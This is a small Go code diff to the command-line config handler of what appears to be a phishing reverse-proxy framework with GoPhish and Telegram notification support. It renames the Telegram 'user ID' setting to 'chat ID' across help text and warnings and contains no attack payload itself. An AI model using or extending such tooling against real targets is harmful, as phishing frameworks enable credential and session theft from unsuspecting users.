@@ -200,7 +200,7 @@ func (t *Terminal) handleConfig(args []string) error {
 			gophishInsecure = "true"
 		}
 
-		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot token", "telegram user id"}
+		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot token", "telegram chat id"}
 		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramUserID()}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
@@ -260,7 +260,7 @@ func (t *Terminal) handleConfig(args []string) error {
 				case "id":
 					t.cfg.SetTelegramUserID(args[3])
 					t.cfg.SaveTelegramConfig()
-					log.Info("Telegram user ID set")
+					log.Info("Telegram chat ID set (can be user ID, group chat ID, or channel ID)")
 					return nil
 				}
 			}
@@ -304,7 +304,7 @@ func (t *Terminal) handleConfig(args []string) error {
 				switch args[2] {
 				case "id":
 					t.cfg.SetTelegramUserID(args[3])
-					log.Info("Telegram user ID set")
+					log.Info("Telegram chat ID set (can be user ID, group chat ID, or channel ID)")
 					return nil
 				}
 			}
@@ -1199,15 +1199,16 @@ func (t *Terminal) monitorLurePause() {
 
 func (t *Terminal) handleCheckTelegram(args []string) error {
 	botToken := t.cfg.GetTelegramBotToken()
-	userID := t.cfg.GetTelegramUserID()
+	chatID := t.cfg.GetTelegramUserID() // This function kept the old name for backward compatibility
 
-	if botToken == "" || userID == "" {
+	if botToken == "" || chatID == "" {
 		log.Warning("Telegram configuration is incomplete:")
 		if botToken == "" {
 			log.Warning("- Telegram bot token is not set. Use 'telegram settoken <token>' to set it.")
 		}
-		if userID == "" {
-			log.Warning("- Telegram user ID is not set. Use 'telegram setuser <user_id>' to set it.")
+		if chatID == "" {
+			log.Warning("- Telegram chat ID is not set. Use 'telegram setuser <chat_id>' to set it.")
+			log.Warning("  Note: <chat_id> can be a user ID, group chat ID, or channel ID.")
 		}
 		log.Info("Telegram notifications are currently disabled.")
 	} else {
@@ -1238,7 +1239,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"gophish", "insecure"}, "gophish insecure <true|false>", "enable or disable the verification of gophish tls certificate (set to `true` if using self-signed certificate)")
 	h.AddSubCommand("config", []string{"gophish", "test"}, "gophish test", "test the gophish configuration")
 	h.AddSubCommand("config", []string{"telegram", "bot", "token"}, "telegram bot token <token>", "set the Telegram bot token")
-	h.AddSubCommand("config", []string{"telegram", "user", "id"}, "telegram user id <id>", "set the Telegram user ID")
+	h.AddSubCommand("config", []string{"telegram", "user", "id"}, "telegram user id <id>", "set the Telegram chat ID (can be user ID, group chat ID, or channel ID)")
 
 	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
 		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
